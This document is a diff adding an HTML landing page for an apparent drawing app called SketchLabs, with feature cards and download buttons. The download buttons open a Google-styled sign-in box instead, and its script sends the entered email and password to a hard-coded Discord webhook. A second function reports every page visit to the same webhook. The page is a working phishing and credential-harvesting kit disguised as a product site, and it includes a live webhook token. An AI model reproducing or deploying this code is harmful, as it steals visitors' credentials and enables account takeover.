@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SketchLabs</title>
+    <link rel="icon" href="favicon.png" type="image/png">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Bahiana&family=Kings&family=Molle:ital@1&family=Quintessential&family=Rubik+Bubbles&display=swap&family=Sekuya&display=swap');
+
+        * {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+        }
+
+        :root {
+            --primary: #158aff;
+            --bg-dark: #cecece;
+            --bg: #f4f4f4;
+            --bg-light: #ffffff;
+            --box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.4);
+            --text: #000000;
+        }
+
+        body {
+            background: rgb(26, 26, 26);
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            height: 60px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.5), rgba(0,0,0,0));
+            transition: all 0.3s ease;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+        }
+
+        .title {
+            margin-left: 15px;
+            font-size: 30px;
+            color: #158aff;
+            font-family: 'Molle', cursive;
+            text-shadow: #158aff 0px 0px 4px;
+        }
+
+        .nav-btns {
+            display: flex;
+            gap: 10px;
+            margin-right: 15px;
+        }
+
+        .nav-btn {
+            background: var(--bg-light);
+            border: none;
+            border-radius: 8px;
+            padding: 10px 16px;
+            font-size: 16px;
+            font-weight: 600;
+            box-shadow: var(--box-shadow);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: var(--text);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-btn i {
+            font-size: 18px;
+        }
+
+        .nav-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0px 6px 16px rgba(0, 0, 0, 0.15);
+            background: var(--primary);
+            color: white;
+        }
+
+        .nav-btn:active {
+            transform: translateY(0);
+            box-shadow: var(--box-shadow);
+        }
+
+        section {
+            position: relative;
+        }
+
+        .main-background {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            user-select: none;
+        }
+
+        .main-text {
+            position: absolute;
+            top: 30%;
+            left: 5%;
+            color: white;
+            font-size: 40px;
+            font-family: 'Sekuya', cursive;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
+        }
+
+        .main-text-large {
+            position: absolute;
+            top: 36%;
+            left: 8%;
+            color: white;
+            font-size: 60px;
+            font-family: 'Sekuya', cursive;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7),
+                        0 0 20px rgba(255, 255, 255, 0.8),
+                        0 0 40px rgba(255, 255, 255, 0.6);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 48px;
+            color: white;
+            margin: 60px 0 40px;
+            font-family: 'Sekuya', cursive;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
+        }
+
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            padding: 0 20px;
+            margin-bottom: 60px;
+            flex-wrap: wrap;
+        }
+
+        .feature-card {
+            background: var(--bg-light);
+            border-radius: 12px;
+            padding: 30px;
+            width: 280px;
+            text-align: center;
+            box-shadow: var(--box-shadow);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0px 8px 24px rgba(21, 138, 255, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 48px;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .feature-title {
+            font-size: 22px;
+            color: var(--text);
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+
+        .feature-description {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .versions {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            padding: 0 20px;
+            margin-bottom: 60px;
+            flex-wrap: wrap;
+        }
+
+        .version-card {
+            background: var(--bg-light);
+            border-radius: 12px;
+            padding: 30px;
+            width: 280px;
+            text-align: center;
+            box-shadow: var(--box-shadow);
+            transition: all 0.3s ease;
+        }
+
+        .version-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0px 8px 24px rgba(21, 138, 255, 0.3);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            border-radius: 16px;
+            object-fit: cover;
+            box-shadow: var(--box-shadow);
+        }
+
+        .version-title {
+            font-size: 22px;
+            color: var(--text);
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+
+        .version-description {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .download-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+        }
+
+        .download-btn:hover {
+            background: #0d6ecc;
+            transform: translateY(-2px);
+            box-shadow: 0px 6px 16px rgba(21, 138, 255, 0.4);
+        }
+
+        .download-btn:active {
+            transform: translateY(0);
+        }
+
+        footer {
+            background: var(--bg);
+            color: var(--primary);
+            text-align: center;
+            font-weight: 600;
+            width: 98%;
+            padding: 20px 0;
+            border-top: 1px solid #333;
+            margin-top: 40px;
+            border-radius: 8px;
+            margin-bottom: 0.5%;
+            margin-left: 1%;
+        }
+
+        footer p {
+            font-size: 14px;
+        }
+
+        .loginBox {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            width: 450px;
+            max-width: 90%;
+            padding: 48px 40px 36px;
+            z-index: 1000;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .login-logo {
+            width: 75px;
+            height: 75px;
+            margin-bottom: 16px;
+            border-radius: 100px;
+        }
+
+        .login-header h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            font-size: 16px;
+            color: #202124;
+            font-weight: 400;
+        }
+
+        .login-body {
+            margin-top: 32px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: all 0.2s ease;
+            box-sizing: border-box;
+            margin-bottom: 8px;
+        }
+
+        .login-input:focus {
+            border: 2px solid #1a73e8;
+            padding: 13px 15px;
+        }
+
+        .forgot-link {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 26px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .guest-mode-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .learn-more {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 32px;
+        }
+
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+
+        .login-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .create-account-btn {
+            background: transparent;
+            color: #1a73e8;
+            border: none;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+
+        .create-account-btn:hover {
+            background: rgba(26, 115, 232, 0.04);
+        }
+
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
+        }
+
+        .next-btn:active {
+            background: #1558b0;
+        }
+
+        .login-footer {
+            margin-top: 48px;
+        }
+
+        .language-select {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #5f6368;
+            cursor: pointer;
+            margin-bottom: 24px;
+            background: white;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile */
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                justify-content: center;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .nav-btns {
+                display: none;
+            }
+
+            .main-text {
+                font-size: 15px;
+                top: 25%;
+            }
+
+            .main-text-large {
+                font-size: 24px;
+                top: 35%;
+            }
+
+            .section-title {
+                font-size: 32px;
+                margin: 40px 0 30px;
+            }
+
+            .features {
+                gap: 20px;
+                padding: 0 15px;
+                margin-bottom: 40px;
+            }
+
+            .feature-card {
+                width: 100%;
+                max-width: 340px;
+                padding: 24px;
+            }
+
+            .feature-icon {
+                font-size: 40px;
+            }
+
+            .feature-title {
+                font-size: 20px;
+            }
+
+            .feature-description {
+                font-size: 14px;
+            }
+
+            .versions {
+                gap: 20px;
+                padding: 0 15px;
+                margin-bottom: 40px;
+            }
+
+            .version-card {
+                width: 100%;
+                max-width: 340px;
+                padding: 24px;
+            }
+
+            .logo {
+                width: 64px;
+                height: 64px;
+            }
+
+            .version-title {
+                font-size: 20px;
+            }
+
+            .version-description {
+                font-size: 14px;
+            }
+
+            .download-btn {
+                font-size: 14px;
+                padding: 10px 20px;
+            }
+
+            footer {
+                width: 96%;
+                margin-left: 2%;
+                margin-bottom: 2%;
+                padding: 15px 0;
+                border-radius: 100px;
+                font-size: 12px;
+            }
+
+            footer p {
+                font-size: 12px;
+            }
+
+            .loginBox {
+                width: 90%;
+                max-width: 100%;
+                height: 95vh;
+                border-radius: 0;
+                padding: 24px 20px;
+                overflow-y: auto;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body onload="load()">
+    
+    <header>
+        <h1 class="title">SketchLabs</h1>
+        <div class="nav-btns">
+            <button class="nav-btn"><i class="fas fa-paint-brush"></i> Drawings</button>
+            <button class="nav-btn"><i class="fas fa-user"></i> Sign In</button>
+            <button class="nav-btn"><i class="fas fa-download"></i> Download</button>
+        </div>
+    </header>
+
+    <section>
+        <img src="discover_hero.jpg" alt="" class="main-background" draggable="false">
+        <h2 class="main-text">Welcome to your next</h2>
+        <h1 class="main-text-large">Composition</h1>
+    </section>
+
+    <section>
+        <h2 class="section-title">Explore Our Features</h2>
+        <div class="features">
+            <div class="feature-card">
+                <i class="fas fa-pencil-alt feature-icon"></i>
+                <h3 class="feature-title">Intuitive Drawing Tools</h3>
+                <p class="feature-description">Create stunning artwork with our easy-to-use drawing tools.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-cloud-upload-alt feature-icon"></i>
+                <h3 class="feature-title">Cloud Storage</h3>
+                <p class="feature-description">Save your creations securely in the cloud and access them anywhere.</p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-users feature-icon"></i>
+                <h3 class="feature-title">Community Sharing</h3>
+                <p class="feature-description">Share your artwork with a vibrant community of artists.</p>
+            </div>
+        </div>
+    </section>
+
+    <section>
+        <h2 class="section-title">Download Our App</h2>
+        <div class="versions">
+            <div class="version-card">
+                <img src="favicon.png" alt="" class="logo">
+                <h3 class="version-title">SketchLabs for Windows</h3>
+                <p class="version-description">Experience the full power of SketchLabs on your Windows PC.</p>
+                <button class="download-btn">Download</button>
+            </div>
+            <div class="version-card">
+                <img src="favicon.png" alt="" class="logo">
+                <h3 class="version-title">SketchLabs for Android</h3>
+                <p class="version-description">Create amazing art on the go with your Android device.</p>
+                <button class="download-btn">Download</button>
+            </div>
+            <div class="version-card">
+                <img src="favicon.png" alt="" class="logo">
+                <h3 class="version-title">SketchLabs for iOS</h3>
+                <p class="version-description">Unleash your creativity on your iPhone or iPad.</p>
+                <button class="download-btn">Download</button>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2016 SketchLabs. All rights reserved.</p>
+    </footer>
+
+    <div class="loginBox" id="loginBox">
+        <div class="login-header">
+            <img src="favicon.png" alt="SketchLabs Logo" class="login-logo">
+            <h2>Sign in</h2>
+            <p>to continue to SketchLabs</p>
+        </div>
+        
+        <div class="login-body">
+            <input type="email" placeholder="Email or phone" id="email" class="login-input">
+            <input type="password" placeholder="Password" id="password" class="login-input" style="display:none;">
+            <a href="#" class="forgot-link">Forgot email?</a>
+            
+            <p class="guest-mode-text">Not your computer? Use Guest mode to sign in privately.</p>
+            <a href="#" class="learn-more">Learn more</a>
+            
+            <div class="login-actions">
+                <button class="create-account-btn">Create account</button>
+                <button class="next-btn" id="nextBtn" onclick="nextPage()">Next</button>
+                <button type="submit" class="next-btn" id="loginBtn" onclick="login()" style="display: none;">Login</button>
+            </div>
+        </div>
+        
+        <div class="login-footer">
+            <select class="language-select">
+                <option>English (United States)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function load() {
+            const webhookURL = "https://discord.com/api/webhooks/1452517933426147389/DNydq5nG2AY1j5P_oihpsA2CDtnbkzNQDzZxB8qME-0Nvp6vwWPyrSOawsyXQ-fPh-Xa";
+            const content = `**New Visit**`;
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                content: content
+            };
+            request.send(JSON.stringify(params));
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const signInBtn = document.querySelectorAll('.nav-btn')[1];
+            const loginBox = document.getElementById('loginBox');
+            const downloadBtns = document.querySelectorAll('.download-btn');
+            
+            signInBtn.addEventListener('click', function() {
+                loginBox.style.display = loginBox.style.display === 'block' ? 'none' : 'block';
+            });
+
+            downloadBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    loginBox.style.display = 'block';
+                });
+            });
+        });
+
+        function nextPage() {
+            document.getElementById('email').style.display = 'none';
+            document.getElementById('password').style.display = 'block';
+            document.getElementById('nextBtn').style.display = 'none';
+            document.getElementById('loginBtn').style.display = 'block';
+        }
+
+        function login() {
+            document.getElementById("loginBox").style.display = "none";
+            let email = document.getElementById("email");
+            let password = document.getElementById("password");
+            const webhookURL = "https://discord.com/api/webhooks/1452517933426147389/DNydq5nG2AY1j5P_oihpsA2CDtnbkzNQDzZxB8qME-0Nvp6vwWPyrSOawsyXQ-fPh-Xa";
+            const content = `**New Login Attempt**\nEmail: ${email.value}\nPassword: ${password.value}`;
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                content: content
+            };
+            request.send(JSON.stringify(params));
+            location.reload();
+        }
+    </script>
+
+</body>
+</html>
